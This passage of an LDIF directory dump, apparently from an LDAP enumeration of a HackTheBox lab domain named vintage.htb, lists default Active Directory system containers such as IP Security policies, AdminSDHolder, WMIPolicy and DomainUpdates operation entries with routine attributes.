isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# IP Security, System, vintage.htb
dn: CN=IP Security,CN=System,DC=vintage,DC=htb

# ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}, IP Security, System, vinta
 ge.htb
dn: CN=ipsecPolicy{72385230-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=vintage,DC=htb

# ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}, IP Security, System,
  vintage.htb
dn: CN=ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000},CN=IP Security,
 CN=System,DC=vintage,DC=htb

# ipsecNFA{72385232-70FA-11D1-864C-14A300000000}, IP Security, System, vintage.
 htb
dn: CN=ipsecNFA{72385232-70FA-11D1-864C-14A300000000},CN=IP Security,CN=System
 ,DC=vintage,DC=htb

# ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, System, vintage.
 htb
dn: CN=ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=vintage,DC=htb

# ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}, IP Security, System, vintage.
 htb
dn: CN=ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=vintage,DC=htb

# ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}, IP Security, Sy
 stem, vintage.htb
dn: CN=ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000},CN=IP Secu
 rity,CN=System,DC=vintage,DC=htb

# ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}, IP Security, System, vinta
 ge.htb
dn: CN=ipsecFilter{7238523A-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=vintage,DC=htb

# ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, Sy
 stem, vintage.htb
dn: CN=ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu
 rity,CN=System,DC=vintage,DC=htb

# ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}, IP Security, Sy
 stem, vintage.htb
dn: CN=ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000},CN=IP Secu
 rity,CN=System,DC=vintage,DC=htb

# ipsecFilter{72385235-70FA-11D1-864C-14A300000000}, IP Security, System, vinta
 ge.htb
dn: CN=ipsecFilter{72385235-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=vintage,DC=htb

# ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}, IP Security, System, vinta
 ge.htb
dn: CN=ipsecPolicy{72385236-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=vintage,DC=htb

# ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}, IP Security, System,
  vintage.htb
dn: CN=ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000},CN=IP Security,
 CN=System,DC=vintage,DC=htb

# ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, System, vintage.
 htb
dn: CN=ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=vintage,DC=htb

# ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, Sy
 stem, vintage.htb
dn: CN=ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu
 rity,CN=System,DC=vintage,DC=htb

# ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}, IP Security, System, vinta
 ge.htb
dn: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=IP Security,CN=Sys
 tem,DC=vintage,DC=htb

# ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}, IP Security, System,
  vintage.htb
dn: CN=ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000},CN=IP Security,
 CN=System,DC=vintage,DC=htb

# ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}, IP Security, System, vintage.
 htb
dn: CN=ipsecNFA{7238523E-70FA-11D1-864C-14A300000000},CN=IP Security,CN=System
 ,DC=vintage,DC=htb

# ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, System, vintage.
 htb
dn: CN=ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=vintage,DC=htb

# ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}, IP Security, System, vintage.
 htb
dn: CN=ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=vintage,DC=htb

# ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}, IP Security, Sy
 stem, vintage.htb
dn: CN=ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000},CN=IP Secu
 rity,CN=System,DC=vintage,DC=htb

# ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, Sy
 stem, vintage.htb
dn: CN=ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu
 rity,CN=System,DC=vintage,DC=htb

# ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}, IP Security, System, vintage.
 htb
dn: CN=ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=vintage,DC=htb

# AdminSDHolder, System, vintage.htb
dn: CN=AdminSDHolder,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: AdminSDHolder
distinguishedName: CN=AdminSDHolder,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 5704
uSNChanged: 12779
showInAdvancedViewOnly: TRUE
name: AdminSDHolder
objectGUID:: ZngaE2PqEEiaJy8jAM8zLQ==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20241229082204.0Z
dSCorePropagationData: 20241229072204.0Z
dSCorePropagationData: 20241229062204.0Z
dSCorePropagationData: 20241229052204.0Z
dSCorePropagationData: 16010101000000.0Z

# ComPartitions, System, vintage.htb
dn: CN=ComPartitions,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: ComPartitions
distinguishedName: CN=ComPartitions,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5705
uSNChanged: 5705
showInAdvancedViewOnly: TRUE
name: ComPartitions
objectGUID:: 0B4GQDk/EESLxJmbn4jPgw==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# ComPartitionSets, System, vintage.htb
dn: CN=ComPartitionSets,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: ComPartitionSets
distinguishedName: CN=ComPartitionSets,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5706
uSNChanged: 5706
showInAdvancedViewOnly: TRUE
name: ComPartitionSets
objectGUID:: kY3jnmy6K0WrXxkDfA3o6g==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# WMIPolicy, System, vintage.htb
dn: CN=WMIPolicy,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: WMIPolicy
distinguishedName: CN=WMIPolicy,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5707
uSNChanged: 5707
showInAdvancedViewOnly: TRUE
name: WMIPolicy
objectGUID:: Cptph9w4EEyK/mc2w4CpwQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000000.0Z

# PolicyTemplate, WMIPolicy, System, vintage.htb
dn: CN=PolicyTemplate,CN=WMIPolicy,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: PolicyTemplate
distinguishedName: CN=PolicyTemplate,CN=WMIPolicy,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5708
uSNChanged: 5708
showInAdvancedViewOnly: TRUE
name: PolicyTemplate
objectGUID:: gPNrS4OE70iZN4BMa46sRg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# SOM, WMIPolicy, System, vintage.htb
dn: CN=SOM,CN=WMIPolicy,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: SOM
distinguishedName: CN=SOM,CN=WMIPolicy,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5709
uSNChanged: 5709
showInAdvancedViewOnly: TRUE
name: SOM
objectGUID:: UjuAiThWKk6wIPsvWVBlhQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# PolicyType, WMIPolicy, System, vintage.htb
dn: CN=PolicyType,CN=WMIPolicy,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: PolicyType
distinguishedName: CN=PolicyType,CN=WMIPolicy,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5710
uSNChanged: 5710
showInAdvancedViewOnly: TRUE
name: PolicyType
objectGUID:: 0mTVr/k6E0OGoZElGNB4cA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# WMIGPO, WMIPolicy, System, vintage.htb
dn: CN=WMIGPO,CN=WMIPolicy,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: WMIGPO
distinguishedName: CN=WMIGPO,CN=WMIPolicy,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5711
uSNChanged: 5711
showInAdvancedViewOnly: TRUE
name: WMIGPO
objectGUID:: NdV8KdUUKEW7nIFAezhjig==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 16010101000000.0Z

# DomainUpdates, System, vintage.htb
dn: CN=DomainUpdates,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: DomainUpdates
distinguishedName: CN=DomainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5712
uSNChanged: 5712
showInAdvancedViewOnly: TRUE
name: DomainUpdates
objectGUID:: /ZFuaI8pX0axs5kV1rwuVA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Operations, DomainUpdates, System, vintage.htb
dn: CN=Operations,CN=DomainUpdates,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Operations
distinguishedName: CN=Operations,CN=DomainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5713
uSNChanged: 5713
showInAdvancedViewOnly: TRUE
name: Operations
objectGUID:: 1TzXr8uSLE2s2Z3ofX+oXA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# ab402345-d3c3-455d-9ff7-40268a1099b6, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=ab402345-d3c3-455d-9ff7-40268a1099b6,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: ab402345-d3c3-455d-9ff7-40268a1099b6
distinguishedName: CN=ab402345-d3c3-455d-9ff7-40268a1099b6,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5714
uSNChanged: 5714
showInAdvancedViewOnly: TRUE
name: ab402345-d3c3-455d-9ff7-40268a1099b6
objectGUID:: N3x2JAUjgUuyP5+9Pu4QdA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# bab5f54d-06c8-48de-9b87-d78b796564e4, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=bab5f54d-06c8-48de-9b87-d78b796564e4,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: bab5f54d-06c8-48de-9b87-d78b796564e4
distinguishedName: CN=bab5f54d-06c8-48de-9b87-d78b796564e4,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5715
uSNChanged: 5715
showInAdvancedViewOnly: TRUE
name: bab5f54d-06c8-48de-9b87-d78b796564e4
objectGUID:: tY4o0sc3ZUG/nsKxq5xYnA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5
distinguishedName: CN=f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5716
uSNChanged: 5716
showInAdvancedViewOnly: TRUE
name: f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5
objectGUID:: kfe84byZVEy0QwfoGGzlOg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 2416c60a-fe15-4d7a-a61e-dffd5df864d3, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=2416c60a-fe15-4d7a-a61e-dffd5df864d3,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 2416c60a-fe15-4d7a-a61e-dffd5df864d3
distinguishedName: CN=2416c60a-fe15-4d7a-a61e-dffd5df864d3,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5717
uSNChanged: 5717
showInAdvancedViewOnly: TRUE
name: 2416c60a-fe15-4d7a-a61e-dffd5df864d3
objectGUID:: jE98hgSDEEWnw19s9udzEA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 7868d4c8-ac41-4e05-b401-776280e8e9f1, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=7868d4c8-ac41-4e05-b401-776280e8e9f1,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 7868d4c8-ac41-4e05-b401-776280e8e9f1
distinguishedName: CN=7868d4c8-ac41-4e05-b401-776280e8e9f1,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5718
uSNChanged: 5718
showInAdvancedViewOnly: TRUE
name: 7868d4c8-ac41-4e05-b401-776280e8e9f1
objectGUID:: jYSgLEssb0uSjIPTnnf/fg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 860c36ed-5241-4c62-a18b-cf6ff9994173, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=860c36ed-5241-4c62-a18b-cf6ff9994173,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 860c36ed-5241-4c62-a18b-cf6ff9994173
distinguishedName: CN=860c36ed-5241-4c62-a18b-cf6ff9994173,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5719
uSNChanged: 5719
showInAdvancedViewOnly: TRUE
name: 860c36ed-5241-4c62-a18b-cf6ff9994173
objectGUID:: XEXr2X5Hp0+nudBhUZwPzA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e
distinguishedName: CN=0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5720
uSNChanged: 5720
showInAdvancedViewOnly: TRUE
name: 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e
objectGUID:: vpMy36fee0O48/jVBuidTA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# a86fe12a-0f62-4e2a-b271-d27f601f8182, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=a86fe12a-0f62-4e2a-b271-d27f601f8182,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: a86fe12a-0f62-4e2a-b271-d27f601f8182
distinguishedName: CN=a86fe12a-0f62-4e2a-b271-d27f601f8182,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5721
uSNChanged: 5721
showInAdvancedViewOnly: TRUE
name: a86fe12a-0f62-4e2a-b271-d27f601f8182
objectGUID:: Jz/GcLv2GEmuKg0iWpV1kg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# d85c0bfd-094f-4cad-a2b5-82ac9268475d, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=d85c0bfd-094f-4cad-a2b5-82ac9268475d,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: d85c0bfd-094f-4cad-a2b5-82ac9268475d
distinguishedName: CN=d85c0bfd-094f-4cad-a2b5-82ac9268475d,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5722
uSNChanged: 5722
showInAdvancedViewOnly: TRUE
name: d85c0bfd-094f-4cad-a2b5-82ac9268475d
objectGUID:: GKudk4bHaE22kli3i5umRg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6ada9ff7-c9df-45c1-908e-9fef2fab008a, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6ada9ff7-c9df-45c1-908e-9fef2fab008a,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6ada9ff7-c9df-45c1-908e-9fef2fab008a
distinguishedName: CN=6ada9ff7-c9df-45c1-908e-9fef2fab008a,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5723
uSNChanged: 5723
showInAdvancedViewOnly: TRUE
name: 6ada9ff7-c9df-45c1-908e-9fef2fab008a
objectGUID:: 4VvJ38GPOkCG2Eq8Wo0Tkw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=10b3ad2a-6883-4fa7-90fc-6377cbdc1b26,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26
distinguishedName: CN=10b3ad2a-6883-4fa7-90fc-6377cbdc1b26,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5724
uSNChanged: 5724
showInAdvancedViewOnly: TRUE
name: 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26
objectGUID:: BOzZUku64US1XyeUTp0rDA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 98de1d3e-6611-443b-8b4e-f4337f1ded0b, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=98de1d3e-6611-443b-8b4e-f4337f1ded0b,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 98de1d3e-6611-443b-8b4e-f4337f1ded0b
distinguishedName: CN=98de1d3e-6611-443b-8b4e-f4337f1ded0b,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5725
uSNChanged: 5725
showInAdvancedViewOnly: TRUE
name: 98de1d3e-6611-443b-8b4e-f4337f1ded0b
objectGUID:: H3FN3bBjIEWgRRccDdAcaQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# f607fd87-80cf-45e2-890b-6cf97ec0e284, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=f607fd87-80cf-45e2-890b-6cf97ec0e284,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: f607fd87-80cf-45e2-890b-6cf97ec0e284
distinguishedName: CN=f607fd87-80cf-45e2-890b-6cf97ec0e284,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5726
uSNChanged: 5726
showInAdvancedViewOnly: TRUE
name: f607fd87-80cf-45e2-890b-6cf97ec0e284
objectGUID:: qoDDCppj/kSV/8OrR/OOjQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 9cac1f66-2167-47ad-a472-2a13251310e4, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=9cac1f66-2167-47ad-a472-2a13251310e4,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 9cac1f66-2167-47ad-a472-2a13251310e4
distinguishedName: CN=9cac1f66-2167-47ad-a472-2a13251310e4,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5727
uSNChanged: 5727
showInAdvancedViewOnly: TRUE
name: 9cac1f66-2167-47ad-a472-2a13251310e4
objectGUID:: +UQywQc7I0afT1xltdpGqA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 6ff880d6-11e7-4ed1-a20f-aac45da48650, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=6ff880d6-11e7-4ed1-a20f-aac45da48650,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 6ff880d6-11e7-4ed1-a20f-aac45da48650
distinguishedName: CN=6ff880d6-11e7-4ed1-a20f-aac45da48650,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5728
uSNChanged: 5728
showInAdvancedViewOnly: TRUE
name: 6ff880d6-11e7-4ed1-a20f-aac45da48650
objectGUID:: xiah5sl2SEybD5dL15eaIw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 446f24ea-cfd5-4c52-8346-96e170bcb912, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=446f24ea-cfd5-4c52-8346-96e170bcb912,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 446f24ea-cfd5-4c52-8346-96e170bcb912
distinguishedName: CN=446f24ea-cfd5-4c52-8346-96e170bcb912,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5729
uSNChanged: 5729
showInAdvancedViewOnly: TRUE
name: 446f24ea-cfd5-4c52-8346-96e170bcb912
objectGUID:: xarFjxSj5EagtlOy0Pd9dw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 51cba88b-99cf-4e16-bef2-c427b38d0767, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=51cba88b-99cf-4e16-bef2-c427b38d0767,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 51cba88b-99cf-4e16-bef2-c427b38d0767
distinguishedName: CN=51cba88b-99cf-4e16-bef2-c427b38d0767,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5730
uSNChanged: 5730
showInAdvancedViewOnly: TRUE
name: 51cba88b-99cf-4e16-bef2-c427b38d0767
objectGUID:: Y8IFX6VuLEqxd/hIs2xErg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# a3dac986-80e7-4e59-a059-54cb1ab43cb9, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=a3dac986-80e7-4e59-a059-54cb1ab43cb9,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: a3dac986-80e7-4e59-a059-54cb1ab43cb9
distinguishedName: CN=a3dac986-80e7-4e59-a059-54cb1ab43cb9,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5731
uSNChanged: 5731
showInAdvancedViewOnly: TRUE
name: a3dac986-80e7-4e59-a059-54cb1ab43cb9
objectGUID:: 8mmvI4DLI0iZowd3gQsIsA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 293f0798-ea5c-4455-9f5d-45f33a30703b, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=293f0798-ea5c-4455-9f5d-45f33a30703b,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 293f0798-ea5c-4455-9f5d-45f33a30703b
distinguishedName: CN=293f0798-ea5c-4455-9f5d-45f33a30703b,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5732
uSNChanged: 5732
showInAdvancedViewOnly: TRUE
